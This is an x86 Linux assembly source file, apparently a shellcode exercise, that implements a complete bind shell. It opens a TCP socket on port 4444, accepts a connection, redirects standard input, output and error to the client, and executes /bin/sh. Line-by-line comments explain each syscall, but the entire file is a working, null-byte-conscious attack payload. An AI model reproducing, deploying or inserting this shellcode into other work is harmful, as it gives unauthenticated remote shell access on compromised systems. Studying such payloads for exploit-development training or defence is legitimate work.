global _start

port equ 0x5c11             ; port = 4444 (big endian)

section .text

_start:
    ; int socketcall(int call, unsigned long *args): syscall 0x66
    ; int socket(int domain, int type, int protocol): socketcall 0x1
    ;   s = socket(AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0)
    xor ebx, ebx            ; ebx = 0
    mul ebx                 ; eax = 0, edx = 0
    push ebx                ; push domain = IPPROTO_IP = 0
    inc ebx                 ; socketcall = 1
    push ebx                ; push type = SOCK_STREAM = 1
    push 0x2                ; push protocol = AF_INET = 2
    mov ecx, esp            ; set socketcall args
    mov al, 0x66            ; syscall = 102
    int 0x80                ; perform syscall
    
    ; struct sockaddr_in { sa_family_t sin_family; in_port_t sin_port; uint32_t s_addr }
    ;   addr_in = { (WORD) AF_INET = 2, (WORD) [PORT], INADDR_ANY = 0 }
    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen): socketcall 0x2
    ;   bind(s, &addr_in, sizeof(sockaddr) = 16)
    pop ebx                 ; socketcall = 2
    pop esi                 ; align stack so that ecx = &addr_in
    push edx                ; push s_addr = INADDR_ANY = 0
    push word port          ; push sin_port = PORT
    push bx                 ; push sin_family = AF_INET = 2
    push 0x10               ; push addrlen = sizeof(sockaddr_in) = 16
    push ecx                ; push addr = &addr_in
    push eax                ; push sockfd = s
    mov ecx, esp            ; set socketcall args
    lea eax, [edx + 0x66]   ; syscall = 102
    int 0x80                ; perform syscall
    
    ; int listen(int sockfd, int backlog): socketcall 0x4
    ;   listen(s, 0)
    mov [ecx + 4], eax      ; set backlog = 0 (eax = 0 from successful bind return and sockfd already set)
    mov bl, 0x4             ; socketcall = 4
    mov al, 0x66            ; syscall = 102
    int 0x80                ; perform syscall
    
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen): socketcall 0x5
    ;   client = accept(s, 0, whatever)
    inc ebx                 ; socketcall = 5 (all arguments already set)
    mov al, 0x66            ; syscall = 102 (eax = 0 from successful listen return)
    int 0x80                ; perform syscall
    
    ; int dup2(int oldfd, int newfd): syscall 0x3f
    ;   dup2(client, 0..2)
    xchg eax, ebx           ; oldfd = client, eax = 5
    lea ecx, [edx + 0x3]    ; newfd = 3
dup_loop:
    dec ecx                 ; decrement newfd
    mov al, 0x3f            ; syscall = 63 (eax = 5 first iteration and dup2 returns stderr = 2 / stdout = 1)
    int 0x80                ; perform syscall
    jnz dup_loop            ; loop until newfd = 0
    
    ; int execve(const char *pathname, char *const argv[], char *const envp[]): syscall 0xb
    ;   execve("//bin/sh", 0, 0)
    pop esi                 ; put null byte on top of stack
    push 0x68732f6e         ; push "n/sh" reversed
    push 0x69622f2f         ; push "//bi" reversed
    mov ebx, esp            ; pathname = "//bin/sh" (argv and envp already set)
    mov al, 0xb             ; syscall = 11 (eax = 0 from dup2 returning stdin)
    int 0x80                ; perform syscall

